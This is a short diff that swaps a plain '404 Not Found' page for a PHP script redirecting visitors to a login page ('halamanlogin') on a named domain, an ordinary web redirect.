@@ -1,1 +1,5 @@
-<h1>404 Not Found</h1>
+<?php
+	$newURL ="https://monevsda-kr.com/public/halamanlogin";
+	header('Location: '.$newURL);
+?>
+
